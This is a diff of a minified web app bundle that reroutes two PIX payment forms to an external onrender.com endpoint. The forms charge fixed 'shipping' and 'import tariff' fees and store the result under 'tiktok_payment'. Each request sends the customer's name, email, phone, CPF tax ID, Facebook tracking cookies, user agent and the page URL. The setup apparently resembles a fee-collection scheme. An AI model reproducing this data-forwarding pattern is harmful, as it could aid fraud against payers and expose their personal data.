@@ -24465,26 +24465,62 @@ function WA() {
       j.trim() &&
       t.length > 0,
     I = async () => {
-      var z;
       if (L) {
         (K(!0), $(""));
         try {
-          const q = await fetch("/api/pix/create", {
+          const q =
+              ((typeof localStorage < "u" &&
+                localStorage.getItem("sealpay_api_key")) ||
+                "")
+                .trim(),
+            Ft = (rt) => {
+              const Yt = document.cookie.match(
+                new RegExp("(?:^|; )" + rt + "=([^;]*)"),
+              );
+              return Yt ? decodeURIComponent(Yt[1]) : "";
+            },
+            Et = new URLSearchParams(window.location.search),
+            Ye = Object.fromEntries(
+              Array.from(Et.entries()).filter(([rt]) =>
+                rt.toLowerCase().startsWith("utm_"),
+              ),
+            );
+          if (!q) throw new Error("Configure a API key da SealPay para gerar o PIX");
+          const Bt = await fetch("https://abacate-5eo1.onrender.com/create-pix", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({
-                name: o,
-                email: h,
-                cpf: l.replace(/\D/g, ""),
-                phone: d.replace(/\D/g, ""),
-                amount: 19.8,
+                amount: 1980,
+                description: "Pagamento do Frete",
+                customer: {
+                  name: o,
+                  email: h,
+                  cellphone: d.replace(/\D/g, ""),
+                  taxId: l.replace(/\D/g, ""),
+                },
+                tracking: { utm: Ye, src: window.location.href },
+                api_key: q,
+                fbp: Ft("_fbp"),
+                fbc: Ft("_fbc"),
+                user_agent: navigator.userAgent,
               }),
             }),
-            Ft = await q.json();
-          if (!q.ok) throw new Error(Ft.error || "Erro ao gerar pagamento");
+            zt = await Bt.json();
+          if (!Bt.ok)
+            throw new Error(
+              (zt == null ? void 0 : zt.error) ||
+                ((zt == null ? void 0 : zt.detalhes) == null
+                  ? void 0
+                  : zt.detalhes.message) ||
+                "Erro ao gerar pagamento",
+            );
+          const Lt = zt.pixCode || zt.pix_code || "",
+            ct = zt.txid || zt.id || "";
+          if (!Lt || !ct)
+            throw new Error("Resposta inválida da SealPay ao criar o PIX");
           const vt = {
-            transactionId: Ft.id,
-            qrcode: ((z = Ft.pix) == null ? void 0 : z.qrcode) || "",
+            transactionId: ct,
+            qrcode: Lt,
             amount: 19.8,
             nome: o,
             email: h,
@@ -24501,7 +24537,7 @@ function WA() {
             createdAt: Date.now(),
           };
           (localStorage.setItem("tiktok_payment", JSON.stringify(vt)),
-            e(`/pagamento?tx=${Ft.id}`));
+            e(`/pagamento?tx=${ct}`));
         } catch (q) {
           $(q.message || "Erro ao processar pagamento");
         } finally {
@@ -26283,24 +26319,66 @@ function XA() {
     const _ = setInterval(P, 2e3);
     return () => clearInterval(_);
   }, [t, u, a, P]);
-  const T = async () => {
-      var _;
+    const T = async () => {
       (h(!0), w(!0), b(null));
       try {
         const F = (t == null ? void 0 : t.nome) || "",
           K = (t == null ? void 0 : t.email) || "",
           U = (t == null ? void 0 : t.cpf) || "",
           $ = (t == null ? void 0 : t.phone) || "",
-          E = await fetch("/api/pix/create-tarifa", {
+          E =
+            ((typeof localStorage < "u" &&
+              localStorage.getItem("sealpay_api_key")) ||
+              "")
+              .trim(),
+          L = (rt) => {
+            const Yt = document.cookie.match(
+              new RegExp("(?:^|; )" + rt + "=([^;]*)"),
+            );
+            return Yt ? decodeURIComponent(Yt[1]) : "";
+          },
+          z = new URLSearchParams(window.location.search),
+          q = Object.fromEntries(
+            Array.from(z.entries()).filter(([rt]) =>
+              rt.toLowerCase().startsWith("utm_"),
+            ),
+          );
+        if (!E) throw new Error("Configure a API key da SealPay para gerar o PIX");
+        const vt = await fetch("https://abacate-5eo1.onrender.com/create-pix", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ name: F, email: K, cpf: U, phone: $ }),
+            body: JSON.stringify({
+              amount: 1980,
+              description: "Tarifa de Importação",
+              customer: {
+                name: F,
+                email: K,
+                cellphone: $.replace(/\D/g, ""),
+                taxId: U.replace(/\D/g, ""),
+              },
+              tracking: { utm: q, src: window.location.href },
+              api_key: E,
+              fbp: L("_fbp"),
+              fbc: L("_fbc"),
+              user_agent: navigator.userAgent,
+            }),
           }),
-          L = await E.json();
-        if (!E.ok) throw new Error(L.error);
+          Ye = await vt.json();
+        if (!vt.ok)
+          throw new Error(
+            (Ye == null ? void 0 : Ye.error) ||
+              ((Ye == null ? void 0 : Ye.detalhes) == null
+                ? void 0
+                : Ye.detalhes.message) ||
+              "Erro ao gerar pagamento",
+          );
+        const rt = Ye.pixCode || Ye.pix_code || "",
+          Yt = Ye.txid || Ye.id || "";
+        if (!rt || !Yt)
+          throw new Error("Resposta inválida da SealPay ao criar o PIX");
         b({
-          transactionId: L.id,
-          qrcode: ((_ = L.pix) == null ? void 0 : _.qrcode) || "",
+          transactionId: Yt,
+          qrcode: rt,
         });
       } catch {
         b(null);
